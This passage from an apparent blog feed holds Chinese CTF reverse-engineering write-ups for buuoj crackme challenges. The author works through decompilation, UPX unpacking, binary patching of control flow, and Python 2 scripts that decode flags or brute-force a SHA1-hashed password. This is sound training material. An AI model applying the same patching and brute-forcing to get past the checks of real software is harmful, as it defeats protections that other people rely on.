class="number">0xDEAB7F029C4FD1B2</span>, <span class="number">0xFACD9D40E7636559</span>]</span><br><span class="line">target = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">target += pack(<span class="string">&quot;Q&quot;</span>, raw[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(target), <span class="number">3</span>):</span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">v8 |= <span class="built_in">ord</span>(target[i+j]) &lt;&lt; <span class="number">8</span> * (<span class="number">2</span> - j)</span><br><span class="line"></span><br><span class="line">v7 = v8</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">idx = (v7 &gt;&gt; <span class="number">6</span> * j) &amp; <span class="number">0b111111</span></span><br><span class="line">flag += table[idx]</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj 逆向刷题之旅（一）</title>
      <link href="/2020/11/10/buuoj-%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/11/10/buuoj-%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>彩笔来 buu 做题了 QAQ，每道做了的我都从不同角度为其添加了关键词，方便 ctrl + F 查找你感兴趣的内容（搜索时请勿区分大小写），持续更新中…</p><p>以下是本文涉及到的关键词：</p><ul><li>架构：x86, JVM, PVM</li><li>文件类型：exe, elf, apk, MachO, pyc, javascript, sys</li><li>考点：upx, java层, base64, maze, 图形界面, DOS, patch, sha1, md5, elf运行流程, 花指令, RSA, 恺撒密码, native层, 变种base64, .NET, 混淆, tea, Unity游戏, 反调试, go语言, 固件分析, xxtea, SMC, AES_ECB, 二叉树, 数独, vm虚拟机, z3, angr,  JsFuck混淆</li></ul><p>PS. 用到的 python 脚本运行环境<strong>除特殊标注外均为 python2</strong>，<strong>如果内容有误或者图片缺失，欢迎联系我修正</strong>。</p><p>剩下也没啥好说的了，送大家一首歌吧，歌名就叫 re</p><iframe frameborder="0" border="1"    marginwidth="0" marginheight="0"    width=100% height=105    src="//music.163.com/outchain/player?type=2&id=570296030&auto=0&height=60"></iframe><br><h3 id="easyre-x86-exe"><a href="#easyre-x86-exe" class="headerlink" title="easyre |x86,exe"></a>easyre |x86,exe</h3><p>shift + F12</p><br><h3 id="reverse1-x86-exe"><a href="#reverse1-x86-exe" class="headerlink" title="reverse1 |x86,exe"></a>reverse1 |x86,exe</h3><p>shift + F12：</p><p><img src="../img/reverse1/1.png" alt="easyre"></p><p>查看交叉引用，找到关键函数 sub_1400118C0：</p><p><img src="../img/reverse1/2.png" alt="reverse1"></p><p>上面的 for 循环将 Str2 中的 o 都替换成 0</p><br><h3 id="reverse2-x86-elf"><a href="#reverse2-x86-elf" class="headerlink" title="reverse2 |x86,elf"></a>reverse2 |x86,elf</h3><p>反编译 main：</p><p><img src="../img/reverse2/1.png" alt="reverse2"></p><p>fork 创建了一个子进程将 flag 中的 i 和 r 都替换成 1</p><br><h3 id="内涵的软件-x86-exe"><a href="#内涵的软件-x86-exe" class="headerlink" title="内涵的软件 | x86,exe"></a>内涵的软件 | x86,exe</h3><p>shift + F12</p><br><h3 id="新年快乐-x86-exe-upx"><a href="#新年快乐-x86-exe-upx" class="headerlink" title="新年快乐 | x86,exe,upx"></a>新年快乐 | x86,exe,upx</h3><p>exe 被 upx 压缩，到 <a href="https://upx.github.io/">网站</a> 下载upx，使用命令 <code>upx.exe -d xnkl.exe -o xnkl_unpack.exe</code> 解压</p><p>ida 打开 xnkl_unpack.exe，找到 main 函数:<br><img src="../img/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/1.png" alt="新年快乐"></p><br><h3 id="BJDCTF-2nd-guessgame-x86-exe"><a href="#BJDCTF-2nd-guessgame-x86-exe" class="headerlink" title="[BJDCTF 2nd]guessgame | x86,exe"></a>[BJDCTF 2nd]guessgame | x86,exe</h3><p>shift + F12</p><br><h3 id="helloword-JVM-apk-java层"><a href="#helloword-JVM-apk-java层" class="headerlink" title="helloword | JVM,apk,java层"></a>helloword | JVM,apk,java层</h3><p>jadx 打开类 com.example.helloword.MainActivity：</p><p><img src="../img/helloword/1.png" alt="helloword"></p><br><h3 id="xor-x86-MachO"><a href="#xor-x86-MachO" class="headerlink" title="xor | x86,MachO"></a>xor | x86,MachO</h3><p>main 函数：</p><p><img src="../img/xor/1.png" alt="xor"></p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rawData = <span class="string">&quot;66 0A 6B 0C 77 26 4F 2E 40 11 78 0D 5A 3B 55 11 70 19 46 1F 76 22 4D 23 44 0E 67 06 68 0F 47 32 4F&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> rawData]</span><br><span class="line"></span><br><span class="line">flag = [target[<span class="number">0</span>]] + [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">flag[i] = target[i] ^ target[i-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag))</span><br></pre></td></tr></table></figure><br><h3 id="reverse3-x86-exe-base64"><a href="#reverse3-x86-exe-base64" class="headerlink" title="reverse3 | x86,exe,base64"></a>reverse3 | x86,exe,base64</h3><p>找到 main_0 函数，根据函数行为还原部分变量及函数名：</p><p><img src="../img/reverse3/1.png" alt="reverse3"></p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">rawData = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">target = <span class="built_in">map</span>(<span class="built_in">ord</span>, rawData)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line">target[i] -= i</span><br><span class="line">src = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, target))</span><br><span class="line"><span class="built_in">print</span> base64.b64decode(src)</span><br></pre></td></tr></table></figure><br><h3 id="不一样的flag-x86-exe-maze"><a href="#不一样的flag-x86-exe-maze" class="headerlink" title="不一样的flag | x86,exe,maze"></a>不一样的flag | x86,exe,maze</h3><p>迷宫题，main 函数：</p><p><img src="../img/%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/1.png" alt="不一样的flag"></p><p>一维化的迷宫是 *11110100001010000101111#，根据 main 函数的判断条件，可知二维状态下一行有 5 个元素，还原二维迷宫：</p><p><img src="../img/%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/2.png" alt="不一样的flag"></p><p>将 上下左右 映射到 1234 去就得到 flag 了</p><p>PS. 这道题出得不严谨，考虑这样一种情况：在一个地方反复先下后上（或者反复左右横跳），然后再走到终点，依然显示顺序正确</p><br><h3 id="SimpleRev-x86-elf"><a href="#SimpleRev-x86-elf" class="headerlink" title="SimpleRev | x86,elf"></a>SimpleRev | x86,elf</h3><p>main 函数调用 Decry 函数，下面是对该函数的分析：</p><p><img src="../img/SimpleRev/1.png" alt="SimpleRev"></p><p>采用爆破的方式获得 flag，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;ADSFKNDCLS&quot;</span>.lower()</span><br><span class="line">key = <span class="built_in">map</span>(<span class="built_in">ord</span>, key)</span><br><span class="line">text = <span class="string">&quot;killshadow&quot;</span></span><br><span class="line">text = <span class="built_in">map</span>(<span class="built_in">ord</span>, text)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">charSet = string.uppercase + string.lowercase</span><br><span class="line">charSet = <span class="built_in">map</span>(<span class="built_in">ord</span>, charSet)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> charSet:</span><br><span class="line"><span class="keyword">if</span> text[i] == (char - <span class="number">39</span> - key[i] + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(char)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="Java逆向解密-JVM-java层"><a href="#Java逆向解密-JVM-java层" class="headerlink" title="Java逆向解密 | JVM,java层"></a>Java逆向解密 | JVM,java层</h3><p>jadx 打开：</p><p><img src="../img/Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/1.png" alt="Java逆向解密"></p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">encrypt = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> encrypt:</span><br><span class="line">flag += <span class="built_in">chr</span>((e ^ <span class="number">32</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="刮开有奖-x86-exe-图形界面-base64"><a href="#刮开有奖-x86-exe-图形界面-base64" class="headerlink" title="刮开有奖 | x86,exe,图形界面,base64"></a>刮开有奖 | x86,exe,图形界面,base64</h3><p>ida 打开……好家伙，又逮到一个不用框架写图形化界面的，想办法干他一炮！</p><p>WinMain 中可以看到该程序就是弹一个对话框，对话框对应的函数是 DialogFunc：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/1.png" alt="刮开有奖"></p><p>DialogFunc 大致的逻辑就是从一个输入框中读取输入，经过一些操作后与特定的值比较：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/2.png" alt="刮开有奖"></p><p>但是运行起来发现找不到应有的输入框和按钮，只有一张图……当我 Resource Hacker 吃素的吗？不能惯着他，打开 RH，exe 拖进去，Dialog -&gt; 103，弄他：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/3.png" alt="刮开有奖"></p><p>修改后：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/4.png" alt="刮开有奖"></p><p>File -&gt; Save As，另存为 2.exe，再运行：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/5.png" alt="刮开有奖"></p><p>输入的问题解决了，接下来细看代码逻辑，遇到的第一个难关是 sub_4010F0：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/6.png" alt="刮开有奖"></p><p>这个函数看起来有点麻烦，还有递归的要素在里面，反正就是对 v7 开始的 10 个整数进行变换。两条路 —— 要么伪代码复制出来写个 C 跑一下，要么动态调试。这我能惯着 Visual Studio？上 OD</p><p>重定位一波 <code>call sub_4010F0</code> 指令的内存地址，下个断，输入框随便整个 8 位数。断下来在数据窗口中跟随 ecx ：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/7.png" alt="刮开有奖"></p><p>步过，再看:</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/8.png" alt="刮开有奖"></p><p>关闭 OD，继续怼 ida：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/9.png" alt="刮开有奖"></p><p>下面的判断语句中要求 <code>v4 = &quot;ak1w&quot;</code>，<code>v5 = &quot;V1Ax&quot;</code>，那 flag[2] ~ flag[7] 都知道了。再往下看：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/10.png" alt="刮开有奖"></p><p>现在的 v7 和 v11 经过 sub_4010F0 的变换已经变成了 ‘3’ 和 ‘J’，OK 游戏结束：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&#x27;&#x27;</span>] * <span class="number">8</span></span><br><span class="line">v4 = <span class="string">&quot;ak1w&quot;</span></span><br><span class="line">v5 = <span class="string">&quot;V1Ax&quot;</span></span><br><span class="line"></span><br><span class="line">t1 = b64decode(v4)</span><br><span class="line">flag[<span class="number">5</span>] = t1[<span class="number">0</span>]</span><br><span class="line">flag[<span class="number">7</span>] = t1[<span class="number">2</span>]</span><br><span class="line">flag[<span class="number">6</span>] = t1[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">t2 = b64decode(v5)</span><br><span class="line">flag[<span class="number">3</span>] = t2[<span class="number">1</span>]</span><br><span class="line">flag[<span class="number">2</span>] = t2[<span class="number">0</span>]</span><br><span class="line">flag[<span class="number">4</span>] = t2[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag[<span class="number">0</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;3&#x27;</span>) + <span class="number">34</span>)</span><br><span class="line">flag[<span class="number">1</span>] = <span class="string">&#x27;J&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><p>芜湖🛫：</p><p><img src="../img/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/11.png" alt="刮开有奖"></p><br><h3 id="BJDCTF-2nd-8086-x86-exe-DOS"><a href="#BJDCTF-2nd-8086-x86-exe-DOS" class="headerlink" title="[BJDCTF 2nd]8086 | x86,exe,DOS"></a>[BJDCTF 2nd]8086 | x86,exe,DOS</h3><p>MS DOS 的程序我是没想到的……ida 打开，因为一个 jmp 死循环导致 ida 不识别剩下的代码，强转一下：</p><p><img src="../img/BJDCTF2nd8086/1.png" alt="BJDCTF2nd8086"></p><p>逻辑很简单:</p><p><img src="../img/BJDCTF2nd8086/2.png" alt="BJDCTF2nd8086"></p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">encode = <span class="string">&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;</span></span><br><span class="line">encode = <span class="built_in">map</span>(<span class="built_in">ord</span>, encode)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> encode:</span><br><span class="line">flag.append(<span class="built_in">chr</span>(char ^ <span class="number">0x1F</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><br><h3 id="GKCTF2020-Check-1n-x86-exe"><a href="#GKCTF2020-Check-1n-x86-exe" class="headerlink" title="[GKCTF2020]Check_1n | x86,exe"></a>[GKCTF2020]Check_1n | x86,exe</h3><p>PS. 绝了这题作者，真有精力嗷，主办方是帮你把下个月的花呗还完了还是咋的……</p><p>开机让输密码，ida shift + F12，查找字符串 “密码错误” 的交叉引用，找到函数 sub_404DF0，往上找找看到密码 HelloWorld:</p><p><img src="../img/GKCTF2020Check_1n/1.png" alt="GKCTF2020Check_1n"></p><p>访问桌面上的 flag 文件，将得到的 base64 串解码，得到 Why don’t you try the magic brick game，那就玩一下打砖块，不用动等他死了上方就会出现 flag</p><br><h3 id="findit-JVM-apk-java层"><a href="#findit-JVM-apk-java层" class="headerlink" title="findit | JVM,apk,java层"></a>findit | JVM,apk,java层</h3><p>jadx 打开：</p><p><img src="../img/findit/1.png" alt="findit"></p><p>变量 b 拼接起来是 pvkq{m164675262033l4m49lnp7p9mnk28k75}</p><p>不用想了，无脑 <a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒解密</a>，位移为 10</p><br><h3 id="GXYCTF2019-luck-guy-x86-elf-patch"><a href="#GXYCTF2019-luck-guy-x86-elf-patch" class="headerlink" title="[GXYCTF2019]luck_guy | x86,elf,patch"></a>[GXYCTF2019]luck_guy | x86,elf,patch</h3><p>关键函数 get_flag：</p><p><img src="../img/GXYCTF2019luck_guy/1.png" alt="GXYCTF2019luck_guy"></p><p>经过分析，得知当执行流依次经过 4、5、1 后会输出正确的 flag。两条路 —— 脚本/patch，那我能惯着 python 吗，patch 安排！</p><p>patch 点 1：先去到 case4</p><p><img src="../img/GXYCTF2019luck_guy/2.png" alt="GXYCTF2019luck_guy"></p><p>patch 点 2：接着执行 case5</p><p><img src="../img/GXYCTF2019luck_guy/3.png" alt="GXYCTF2019luck_guy"></p><p>patch 点 3：case5 结束后跳转到 case1</p><p><img src="../img/GXYCTF2019luck_guy/4.png" alt="GXYCTF2019luck_guy"></p><p>patch 点 4：case1 结束后退出函数</p><p><img src="../img/GXYCTF2019luck_guy/5.png" alt="GXYCTF2019luck_guy"></p><p>F5 一下可以看到，现在的执行流是正确的：<br><img src="../img/GXYCTF2019luck_guy/6.png" alt="GXYCTF2019luck_guy"></p><p>放到 linux 下去跑就能出 flag（等待输入那里输一个2就行）</p><br><h3 id="简单注册器-JVM-apk-java层"><a href="#简单注册器-JVM-apk-java层" class="headerlink" title="简单注册器 | JVM,apk,java层"></a>简单注册器 | JVM,apk,java层</h3><p>jadx 打开，逻辑很简单：</p><p><img src="../img/%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/1.png" alt="简单注册器"></p><p>直接把生成 flag 的部分拿出来改一下吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span></span><br><span class="line">x = <span class="built_in">map</span>(<span class="built_in">ord</span>, x)</span><br><span class="line">x[<span class="number">2</span>]  = ((x[<span class="number">2</span>] + x[<span class="number">3</span>]) - <span class="number">50</span>)</span><br><span class="line">x[<span class="number">4</span>]  = ((x[<span class="number">2</span>] + x[<span class="number">5</span>]) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">30</span>] = ((x[<span class="number">31</span>] + x[<span class="number">9</span>]) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">14</span>] = ((x[<span class="number">27</span>] + x[<span class="number">28</span>]) - <span class="number">97</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">tmp = x[<span class="number">31</span> - i]</span><br><span class="line">x[<span class="number">31</span> - i] = x[i]</span><br><span class="line">x[i] = tmp</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, x))</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="rsa-rsa"><a href="#rsa-rsa" class="headerlink" title="rsa | rsa"></a>rsa | rsa</h3><p>额，纯密码学的题，走错分区了吧老哥，题解见 <a href="https://blog.csdn.net/weixin_30607659/article/details/101533319">链接</a></p><br><h3 id="GWCTF-2019-pyre-PVM-pyc"><a href="#GWCTF-2019-pyre-PVM-pyc" class="headerlink" title="[GWCTF 2019]pyre | PVM,pyc"></a>[GWCTF 2019]pyre | PVM,pyc</h3><p>用 uncompyle6 或者 <a href="https://tool.lu/pyc/">在线网站</a> 反编译 pyc 文件，得到 python 源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure><p>不想想了，爆破吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line">code = <span class="built_in">map</span>(<span class="built_in">ord</span>, code)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">code[i] ^= code[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line"><span class="keyword">if</span> code[i] == ((j + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="CrackRTF-x86-exe-sha1-md5"><a href="#CrackRTF-x86-exe-sha1-md5" class="headerlink" title="CrackRTF | x86,exe,sha1,md5"></a>CrackRTF | x86,exe,sha1,md5</h3><p>main_0 函数检查第一个输入的部分：</p><p><img src="../img/CrackRTF/1.png" alt="CrackRTF"></p><p>如何判断 sub_40100A 是 sha1 哈希函数呢，点进去发现它调用 sub_401230，继续跟进：</p><p><img src="../img/CrackRTF/2.png" alt="CrackRTF"></p><p>根据 windows API 的尿性，CryptCreateHash 函数的第二个参数应该用来指定 hash 的类型。在 <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(CryptCreateHash);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue">MSDN 文档</a> 中查找该函数：</p><p><img src="../img/CrackRTF/3.png" alt="CrackRTF"></p><p>点 <a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">ALG_ID</a> 进去查找 0x8004：</p><p><img src="../img/CrackRTF/4.png" alt="CrackRTF"></p><p>那密码 1 就能得到了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1Encode</span>(<span class="params">plain</span>):</span></span><br><span class="line">sha = hashlib.sha1(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> sha.hexdigest().upper()</span><br><span class="line"></span><br><span class="line">passwd1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>, <span class="number">1000000</span>):</span><br><span class="line">plain = <span class="built_in">str</span>(i) + <span class="string">&quot;@DBApp&quot;</span></span><br><span class="line"><span 